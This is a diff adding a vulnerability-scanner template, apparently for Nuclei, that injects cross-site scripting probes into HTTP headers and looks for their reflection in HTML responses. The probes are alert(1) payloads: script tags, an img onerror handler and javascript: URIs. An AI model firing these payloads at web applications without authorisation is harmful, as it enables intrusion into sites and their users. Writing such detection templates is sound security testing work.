@@ -1,0 +1,33 @@
+id: xss-polyglot-header
+info:
+  name: XSS via Header Polyglot
+  author: WhiteFatalis
+  severity: medium
+  description: Injects a polyglot XSS payload into various headers to check for reflection and execution.
+  tags: xss, polyglot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      User-Agent: "javascript://%250Aalert(1)//"
+      Referer: "\"><script>alert(1)</script>"
+      X-Forwarded-For: "\"><img src=x onerror=alert(1)>"
+      X-Client-IP: "javascript:alert(1)"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "javascript://%250Aalert(1)//"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
